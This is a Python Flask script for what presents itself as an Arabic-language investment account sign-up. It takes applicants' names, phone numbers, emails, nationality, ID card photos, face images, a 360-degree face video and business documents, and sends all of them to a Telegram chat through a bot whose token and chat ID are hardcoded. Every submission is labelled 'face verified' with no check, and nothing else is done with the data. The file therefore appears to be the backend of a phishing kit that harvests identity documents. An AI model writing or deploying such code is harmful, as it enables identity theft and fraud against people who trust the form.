#!/usr/bin/env python3
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from datetime import datetime
from werkzeug.utils import secure_filename
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)

# Configuration
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8660100340:AAEPj1rlH5PfPZ8StoztNi2m7ZmOOgzLrr4')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '-1003890710277')
UPLOAD_FOLDER = '/tmp'
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'pdf', 'mp4', 'webm'}

TELEGRAM_API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}'

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def send_telegram(endpoint, data=None, files=None):
    try:
        url = f'{TELEGRAM_API_URL}/{endpoint}'
        if files:
            response = requests.post(url, data=data, files=files, timeout=60)
        else:
            response = requests.post(url, json=data, timeout=10)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        print(f"Telegram Error: {e}")
        return None

@app.route('/', methods=['POST', 'GET'])
@app.route('/api/submit-form', methods=['POST', 'GET'])
@app.route('/api/submit-form/', methods=['POST', 'GET'])
def submit_form():
    if request.method == 'GET':
        return jsonify({'success': True, 'message': 'API is active. Use POST to submit data.'})
    try:
        if request.is_json:
            form_data = request.json
        else:
            form_data = request.form

        msg = form_data.get('message')
        
        if not msg:
            data = {
                'fullName': form_data.get('fullName', 'N/A'),
                'phone': form_data.get('phone', 'N/A'),
                'email': form_data.get('email', 'N/A'),
                'nationality': form_data.get('nationality', 'N/A'),
                'idType': form_data.get('idType', 'N/A')
            }

            msg = f"""🔔 <b>طلب فتح حساب استثماري جديد</b>
─────────────────────
👤 <b>البيانات الشخصية</b>
• الاسم: {data['fullName']}
• الهاتف: {data['phone']}
• البريد: {data['email']}
• الجنسية: {data['nationality']}

🪪 <b>وثيقة الهوية</b>
• النوع: {data['idType']}

🤳 <b>التحقق من الوجه</b>
• الحالة: ✅ تم التحقق بنجاح
─────────────────────
🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        send_telegram('sendMessage', data={'chat_id': TELEGRAM_CHAT_ID, 'text': msg, 'parse_mode': 'HTML'})

        file_map = {
            'idFront': ('photo', '🪪 الوجه الأمامي للهوية'),
            'idBack': ('photo', '🪪 الوجه الخلفي للهوية'),
            'faceImage': ('photo', '🤳 صورة الوجه'),
            'faceVideo': ('video', '🎥 فيديو التحقق 360 درجة'),
            'crFile': ('document', '🏢 السجل التجاري'),
            'licFile': ('document', '🏢 الترخيص التجاري'),
            'idFile': ('photo', '👤 هوية المالك'),
            'authFile': ('document', '📝 التفويض')
        }

        full_name = form_data.get('fullName', form_data.get('companyName', 'N/A'))

        for field, (tg_type, caption) in file_map.items():
            if field in request.files:
                f = request.files[field]
                if f and allowed_file(f.filename):
                    ext = f.filename.rsplit('.', 1)[1].lower()
                    filename = secure_filename(f"{field}_{datetime.now().timestamp()}.{ext}")
                    path = os.path.join(UPLOAD_FOLDER, filename)
                    f.save(path)
                    
                    with open(path, 'rb') as file_bytes:
                        if tg_type == 'photo': endpoint = 'sendPhoto'
                        elif tg_type == 'video': endpoint = 'sendVideo'
                        else: endpoint = 'sendDocument'
                        
                        tg_files = {tg_type: file_bytes}
                        tg_data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"{caption}\nالاسم: {full_name}"}
                        send_telegram(endpoint, data=tg_data, files=tg_files)
                    
                    os.remove(path)

        return jsonify({'success': True, 'message': 'تم استلام الطلب بنجاح'})

    except Exception as e:
        print(f"Error in submit_form: {e}")
        return jsonify({'success': False, 'message': str(e)}), 500

# Vercel needs the app object
# handler = app
